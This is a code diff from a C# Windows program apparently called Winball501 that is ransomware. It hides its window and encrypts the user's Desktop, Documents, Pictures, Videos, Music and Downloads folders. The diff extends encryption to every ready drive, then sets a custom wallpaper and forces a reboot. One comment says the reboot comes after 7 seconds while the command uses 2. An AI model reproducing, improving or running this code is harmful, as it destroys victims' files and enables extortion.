@@ -28,11 +28,6 @@ namespace Winball501_Decryptor
             }
             else
             {
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    Properties.Resources.winball501.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
-                    File.WriteAllBytes(Environment.GetEnvironmentVariable("SystemDrive") + "\\winball501.png", ms.ToArray());
-                }
                 InitializeComponent();
             }
         }
@@ -117,39 +112,71 @@ namespace Winball501_Decryptor
         public async void load()
         {
             this.Visible = false;
-            string encryptedFile = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive"), "encrypted.txt");
+            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive");
+            string encryptedFile = Path.Combine(systemDrive, "encrypted.txt");
 
             if (!File.Exists(encryptedFile))
             {
-                foreach (Environment.SpecialFolder folder in new[] {
-    Environment.SpecialFolder.Desktop,
-    Environment.SpecialFolder.MyDocuments,
-    Environment.SpecialFolder.MyPictures,
-    Environment.SpecialFolder.MyVideos,
-    Environment.SpecialFolder.MyMusic,
+                List<Task> tasks = new List<Task>();
 
-})
+                // Encrypt common user directories
+                foreach (Environment.SpecialFolder folder in new[]
+                {
+            Environment.SpecialFolder.Desktop,
+            Environment.SpecialFolder.MyDocuments,
+            Environment.SpecialFolder.MyPictures,
+            Environment.SpecialFolder.MyVideos,
+            Environment.SpecialFolder.MyMusic,
+        })
                 {
                     string path = Environment.GetFolderPath(folder);
                     Encrypt encrypt = new Encrypt(this, publickey, path);
                     tasks.Add(Task.Run(() => encrypt.run()));
                 }
-                string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
 
-                Encrypt encrypt1 = new Encrypt(this, publickey, downloadsPath);
-                tasks.Add(Task.Run(() => encrypt1.run()));
+                // Encrypt Downloads folder
+                string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+                Encrypt encryptDownloads = new Encrypt(this, publickey, downloadsPath);
+                tasks.Add(Task.Run(() => encryptDownloads.run()));
+
+                // Encrypt all available drives (excluding system drive already handled)
+                foreach (DriveInfo drive in DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady) // Only process ready drives
+                    {
+                        string drivePath = drive.RootDirectory.FullName;
+                        Encrypt encryptDrive = new Encrypt(this, publickey, drivePath);
+                        tasks.Add(Task.Run(() => encryptDrive.run()));
+                    }
+                }
+
+                // Mark encryption as completed
                 File.Create(encryptedFile).Close();
+
+                // Wait for all tasks to finish
                 await Task.WhenAll(tasks);
+
+                // Make form visible again
                 this.Visible = true;
-                SystemParametersInfo(spi, 0, Environment.GetEnvironmentVariable("SystemDrive") + "\\winball501.png", spif | send);
-                //Everything is done now restart PC
-                Process.Start("shutdown", "/r /t 7");
+
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    Properties.Resources.winball501.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                    File.WriteAllBytes(Environment.GetEnvironmentVariable("SystemDrive") + "\\winball501.png", ms.ToArray());
+                }
+
+                // Change wallpaper
+                SystemParametersInfo(spi, 0, Path.Combine(systemDrive, "winball501.png"), spif | send);
+
+                // Restart system after 7 seconds
+                Process.Start("shutdown", "/r /t 2");
             }
             else
             {
                 this.Visible = true;
             }
         }
+
         class Encrypt
         {
             Form1 form;
